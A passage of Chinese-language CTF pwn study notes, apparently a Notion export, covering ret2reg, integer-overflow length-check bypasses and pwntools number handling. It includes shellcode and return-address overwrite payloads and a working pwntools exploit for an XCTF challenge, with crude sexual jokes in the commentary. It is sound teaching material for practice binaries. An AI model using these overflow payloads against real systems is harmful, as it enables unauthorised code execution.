id="6c5afcac-b6e3-457a-b78f-8eb226da57f8" class="">实现在buf处溢出写入一些东西并ret2任意地址</p><p id="f649df1b-8ac2-43bd-a779-acb7ccd1409c" class="">【漏洞扩大】</p><blockquote id="7fb207a5-db80-43fb-90b0-01b483e275b5" class="">以下例子是基于<mark class="highlight-teal">无NX</mark>和<mark class="highlight-teal">已知代码段的绝对地址</mark>（也就是不能有PIE）的这两个条件</blockquote><ul id="40efd672-9b5f-47a0-a983-0c9411d99a7a" class="toggle"><li><details open=""><summary>在不知道栈上buf绝对地址时实现任意执行（<strong>ret2register技巧就是用来绕过栈地址被随机化的特点</strong>）</summary><p id="c3e0c40d-fa70-4d1d-8c9a-93f4a9640e28" class="">观察fuck函数在调用_strcpy之前，会将buf地址放在eax，不管栈地址怎么随机化，eax必定指向buf地址</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6efcbd32-dd46-4718-a058-57ad619b7d57" class="code"><code class="language-Assembly">.text:0804841A                 lea     eax, [ebp+buffer]
+.text:08048420                 push    eax             ; dest
+.text:08048421                 call    _strcpy</code></pre><p id="83f81500-b02a-4cd5-944b-43495b3c303a" class="">跟踪_strcpy函数，发现直到ret时，eax都会一直指向buf地址</p><p id="a11abcce-6215-4a64-8297-b65b3aa950ab" class="">所以我们可以控制程序ret到这样一处gadgets：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ccb2fd98-36dc-463e-8e0d-bb0acb7aaac0" class="code"><code class="language-Assembly">root@ubuntu:/mnt/hgfs/ubuntu_share/pwn/interrop# objdump -d ret2reg | grep *%eax
+ 8048373:	ff d0                	call   *%eax</code></pre><p id="107215db-f489-43e1-84f4-330802f58ef3" class="">这样也就相当于ret到了buf处执行我们的shellcode</p><p id="22866a73-359c-4c8c-8dcc-fb66f5ac9cfa" class="">exp如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c3428b1-2c05-472b-9d1d-a5768107ab31" class="code"><code class="language-Assembly">call_eax=0x8048373
+
+payload = shellcode
+payload = payload.ljust(512+0x60,b&#x27;A&#x27;)
+payload+= call_eax</code></pre></details></li></ul><h1 id="15e514f3-4bf3-4bea-8525-a4bc443400a0" class="">二、整数溢出点汇总</h1><h3 id="297f72ee-6d8c-4388-8fdc-29310238f352" class="">1-变量类型疏忽导致的整数绕过</h3><p id="f85e8b72-209c-48ca-9929-0ba8d3500f58" class="">【定义】</p><p id="650a71f0-2321-4be2-ac29-d11fa02126f0" class="">一般来说，程序防止溢出一般最好的方法就是直接在read传参处限制</p><p id="f53dab0f-66f2-4339-85a2-c3ce59aa3c3f" class="">但有些程序闲得蛋疼，就会有一些别的写法</p><ul id="69800252-32af-4145-b3b4-a9c580b273cb" class="toggle"><li><details open=""><summary>例如</summary><p id="267a879d-6b7d-461a-9fde-899d9a48daee" class="">这样：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5edb8b71-a441-4f9e-ba3f-162da709ea94" class="code"><code class="language-Python">cin&gt;&gt;size;
+限制size语句
+read(0,buf,size);</code></pre><p id="a4a14abf-846c-452e-bd66-617c48ccc544" class="">或者这样：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="66121d9d-cc43-4688-918a-b5503be0c7a8" class="code"><code class="language-Python">fun(buf1){
+	buf2[num]
+	限制len(buf2)语句
+	strcpy(buf1,buf2)
+}</code></pre></details></li></ul><p id="68550979-287d-4921-b4fe-17a979f0a6d6" class="">这些写法有时候会有漏洞产生</p><p id="34af9ef2-510e-47dd-b0c6-6f6e2a45becd" class="">这里重点的就是关注<strong><mark class="highlight-teal"><code>条件比较</code></mark></strong>语句里面或者前面是否出现<mark class="highlight-teal">类型转换</mark></p><p id="ae4183db-6509-4978-b24a-a7ae2aabf3b8" class="">【例题】</p><ul id="bf76fb9a-7803-4c40-b98e-95feb6c507ca" class="toggle"><li><details open=""><summary>这里是一道写明了的比较时类型转换题</summary><p id="b89796e4-3d96-4eb9-9403-c56431874a95" class=""><strong>1、题目内容</strong></p><p id="3a1db42e-8477-40c8-87ec-61202e2fdb82" class="">输入一个数字，程序限制它应该≤64，但出于攻击需要，要想办法让它&gt;64</p><p id="61c354f5-7098-4c23-90bf-cb5fe7c7422d" class="">程序逆向代码如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b304d95d-5fef-49e7-8a8c-cd58025d27c5" class="code"><code class="language-C">_isoc99_scanf(&quot;%d&quot;,&amp;size);
+if((int)size&gt;64)
+	exit(0);
+read(0,buf,(unsigned int)size);</code></pre><p id="0f40bf49-7178-4fd0-a7c3-54e08e467292" class=""><strong>2、分析</strong></p><p id="e853297b-514c-4a2d-9880-c8b8c0a89b56" class="">由于程序编写者的疏忽，导致nbytes在传参read时是unsigned int型，而在if比较时是int型</p><p id="e39ffb10-a568-48c5-8e28-6683cfef8fd8" class="">这样就可以构造nbytes=2147483648，这个数在if判断时会被视为一个负数，但在read传参时又会被视为一个很大的正数</p></details></li></ul><ul id="c770539f-9d97-4e33-9608-8dd99881c51c" class="toggle"><li><details open=""><summary>这里是一道比较隐晦的比较时类型转换题</summary><figure id="f0093976-5053-439f-8abf-ad92ae05f6c7"><div class="source"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/int_overflow.rar">int_overflow.rar</a></div></figure><ul id="63b1687b-369d-4f26-8d9e-ea87cb88c482" class="toggle"><li><details open=""><summary><strong>1、逆向</strong></summary><p id="594d5ec4-a0ad-4657-9385-48a29a1aa695" class="">checksec：</p><figure id="d1f94045-e4bd-4ea5-af0c-a94226fefe2f" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled.png"><img style="width:392px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled.png"/></a></figure><p id="246f5823-4ccb-4725-a8fd-bfc7054e4877" class="">32位只开nx，噢小可爱打扮得这么暴露可是会让人忍不住会有坏想法的哦</p><p id="46cb9e39-785a-4423-abfe-60204d133da2" class="">IDA查看：</p><figure id="33d34d2c-288a-4137-a980-39069da11de9" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%201.png"><img style="width:499px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%201.png"/></a></figure><p id="4d5ac686-169a-484b-bb14-17422812df7b" class="">只有一个login，那就看看要如何进入你吧 ❤️:</p><figure id="98c52b8a-650b-447a-a342-f1013aa6c4ae" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%202.png"><img style="width:336px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%202.png"/></a></figure><p id="f30c0f39-5afa-476a-a1db-92ce05aaa56a" class="">这里倒是挺终归中举严严实实的，再看看你的检查</p><figure id="c5b69038-931c-4bfb-9a33-b9bc1a188b37" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%203.png"><img style="width:288px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%203.png"/></a></figure><p id="256294ed-e898-4c88-b066-4cf7f18bd5b9" class="">pw可以写到409B，而buf却只能写到11B，看来我今晚的计划就是在这个strcpy这里把你灌满了呀，但是在此之前，我们还得先绕过一下这个可恶的strlen：</p><figure id="4512340f-d00f-459a-8c03-fe081553e7be" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%204.png"><img style="width:240px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%204.png"/></a></figure><p id="740287aa-3479-4837-942e-69b85efa598c" class="">小后门都俏的这么开了啊，嘴上说着不要，身体却很诚实嘛</p></details></li></ul><ul id="7b885f21-96ca-4de3-9c6a-14cbba82b529" class="toggle"><li><details open=""><summary><strong>2、思路</strong></summary><p id="55d68cde-d0f1-4ba1-af32-f8975cde604f" class="">注意这个len4Pw，他tmd是个byd_int8型，受不了了，组织里面的叛徒是吧，啊啊啊彻底疯狂！</p><p id="d8e85651-53b5-4ae8-aedd-ed2b73939784" class="">那这个就简单了，直接因为他是8字节，所以最高是0xff。那我们直接给他传个0x106个字节导致溢出变成6字节不就绕过检查了吗</p></details></li></ul><ul id="e79c53a1-da8d-488d-bdcd-100a01702f1d" class="toggle"><li><details open=""><summary><strong>3、exp</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fec0bf1b-2271-45af-9f6a-8468608e0a7a" class="code"><code class="language-Python">from pwn import *
+context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)
+#p=remote(&#x27;111.198.29.45&#x27;,44241)
+p=process(&quot;./pwn&quot;)
+houmen_addr= 0x08048694
+ 
+p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)
+p.sendlineafter(&quot;username:\n&quot;,&quot;xctf&quot;)
+payload = b&quot;A&quot; * 0x14 + b&quot;AAAA&quot; + p32(houmen_addr) + &quot;A&quot; * 234
+p.sendlineafter(&quot;passwd:\n&quot;,payload)
+print(p.recvall())</code></pre></details></li></ul></details></li></ul><ul id="c607303d-9da5-4f95-bb2d-66a971ae649a" class="toggle"><li><details open=""><summary>这里我再提出一种比较隐晦的比较时类型转换题(经过实验行不通)</summary><p id="79f82d7e-aa52-4ebe-8b7a-2005ba3a729c" class="">能不能这样呢↓</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0e9f93ed-a93d-4f27-af11-b5207b6ca83a" class="code"><code class="language-C">unsigned int size=0;
+cin&gt;&gt;size;
+if(size&gt;100)//数字字面量无后缀时默认是int型
+	exit(0);
+read(0,buf,size);//read传参是unsigned int型
+
+2147483647-&gt;2147483649</code></pre><p id="22e531ee-10aa-4b19-af80-b4202d0833cc" class="">我们设想是size&gt;100处size被转int型再比较，实际是100转了unsigned int再比较，寄</p></details></li></ul><h3 id="480ad16b-1a6c-4af4-b08a-f1d7c0b4ffea" class="">2-加减操作导致的整数溢出</h3><p id="7732a873-528b-48e7-a74f-118a95f1c930" class="">【定义】</p><p id="b2ed02ee-402b-4944-b020-0e220058ac6c" class="">程序设计者的预期是“对某个数字A减去数字B”，但是因为没有想到B可能是负数，导致某个数字A减后反而自己变成一个很大的正数</p><p id="de2806b7-c7e2-49f3-bbfb-8e972709ac2e" class="">【例题】</p><ul id="bb58baa0-9844-468d-8146-da7ee12f65f7" class="toggle"><li><details open=""><summary>以这道saokao为例</summary><figure id="0e045155-db96-4a0a-9ff2-26604ef592b7" class="image"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%205.png"><img style="width:335px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%205.png"/></a></figure></details></li></ul><h3 id="fe8f004c-bd96-489c-8eaa-2d70f55cf540" class="">3-对stelen、strcpy函数的绕过</h3><p id="232623dd-6605-42bf-9a31-e613cd393dc2" class="">利用’\x00’可以作为字符串结尾的特点，可以绕过strlen函数</p><h3 id="0c5d122b-6ef5-4b50-b6b1-56c8fa9ce85c" class="">4-其他</h3><figure id="5091dcfd-52f9-425d-ba79-222f9bcae0ef" class="image" style="text-align:left"><a href="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%206.png"><img style="width:480px" src="%E3%80%90%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E2%80%9C%E5%85%A5%E5%8F%A3%E7%82%B9%E2%80%9D%E6%B1%87%E6%80%BB+%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B1%87%E6%80%BB+%E6%95%B0%E5%AD%97%E7%9A%84%E4%BA%A4%E4%BA%92%2031c64e78ae6a4b10996063bce2f11938/Untitled%206.png"/></a></figure><h1 id="416d0f21-74fc-4f63-8aea-71abd9d327a4" class="">三、交互过程中，数字的处理</h1><p id="aa721ee3-88e0-4454-bae9-d4e3e24dedfe" class=""><mark class="highlight-orange_background"><strong>1、传给程序数字的时候，要考虑在两种情况下分别传给他不同的类型：</strong></mark><div class="indented"><p id="994d35b0-b994-4355-959d-845eaab24b84" class="">如果接收端有像scanf(”%i”,buf)这样的把控制台输入字符串转数字格式底层字节存储的情况，就可以直接传参字符串形式的数字，即：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f82fee66-9fbe-4000-8385-4f57eb9097cb" class="code"><code class="language-Python">str(number2send).encode()</code></pre></div></p><p id="b7341301-16b4-4492-a6fa-fb60122ce4c6" class="">如果接收端的是像scanf(”%s”,buf)这样的没有把控制台输入字符串转数字格式底层字节存储的情况，就要手动做转换，即：<div class="indented"><p id="2fffda7f-cb15-40bf-b236-bcee6f694573" class=""><code>p32</code>：将数字转成16进制4B的小端存储的字节流</p><p id="c2dd5831-222e-45d9-804b-7f64b0a35b93" class=""><code>p64</code>：将数字转成16进制8B的小端存储的字节流</p></div></p></div></p><p id="5153044f-aa6a-4651-b997-f67e3ff8cee9" class=""><mark class="highlight-orange_background"><strong>2、接收程序传参的时候，要考虑在两种情况下分别进行不同的转换：</strong></mark><div class="indented"><p id="aae325b7-514a-4e84-8f3a-7392bb44cee9" class="">如果它是泄露方式是像puts()这样直接字符串输出，那我们就要把它按照小端序读出数字，即：<div class="indented"><p id="ca801360-d293-41c2-86b3-c52edac88052" class=""><code>u32</code>：将一个4B字节流当作一个16进制4B的小端存储的数字，然后翻译成数字</p><p id="627c965a-bcb2-4b01-b949-682c4ea8b829" class=""><code>u64</code>：将一个8B字节流当作一个16进制8B的小端存储的数字，然后翻译成数字</p></div></p><p id="1c2ec989-750b-4410-8af0-4fa79f41446a" class="">如果它是泄露方式是像printf(”%i”)这样当成一个数字或者像printf(”%p”)这样的，即：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99e735ab-8837-4646-a89e-61663b260fa3" class="code"><code class="language-Python">atoi(number2recv)</code></pre></div></p></div></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
